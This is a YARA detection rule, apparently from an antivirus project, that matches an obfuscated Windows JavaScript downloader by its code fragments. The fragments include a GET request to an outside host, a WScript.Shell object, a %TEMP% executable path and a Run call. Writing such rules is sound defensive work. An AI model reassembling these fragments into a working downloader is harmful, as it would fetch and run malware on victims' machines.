rule sig_20160330_916e77edc1bf035e4cde1e6d6d5e4aa3 {
  meta:
    description = "datamaliciousorder - file 20160330_916e77edc1bf035e4cde1e6d6d5e4aa3.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "dd3ea040692b9df211e5a76c1567878fa6f6e6c04f9a0243ff9abf8761019033"

  strings:
    $s1  = "_K0[_Z](\"GET\", \"http://spasupplyexpert.com/b3osa\", false);" fullword ascii
    $s2  = "function _XX(_Q0, _J0){_BM = _BM * 1; return _Q0 - _J0;};" fullword ascii
    $s3  = "var _J = function _XE() {return WScript[_DR](\"WScript\"+\".Shell\");}(), _I0 = 11;" fullword ascii
    $s4  = "if (_K0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _P(){return _HW + \"\";};" fullword ascii
    $s6  = "function _WO() {return _J[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"vMA8uf1DUFNmb8z.ex\" + \"e\";};" fullword ascii
    $s7  = "function _NM() {return ((_I1 == true) && (_I1 == _JX)) ? 1 : _BM;};" fullword ascii
    $s8  = "function _QE(_OP){_J[\"Run\"](_OP, _BM, _BM);};" fullword ascii
    $s9  = "var _IQ = new this[\"Date\"]();" fullword ascii
    $s10 = "function _I(){return _DR;};" fullword ascii
    $s11 = "function _B(){return 22;};" fullword ascii
    $s12 = " while (_KS){" fullword ascii
    $s13 = "function _LM(_T) {var _Z0 = (1, 2, 3, 4, 5, _T); return _Z0;};" fullword ascii
    $s14 = "function _UZ()" fullword ascii
    $s15 = "return _XX(_BK, _IQ0);" fullword ascii
    $s16 = "var _JX = false;" fullword ascii
    $s17 = "_I1 = true; " fullword ascii
    $s18 = "var _Z1 = false;" fullword ascii
    $s19 = "var _I1 = false;" fullword ascii
    $s20 = "_JX = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}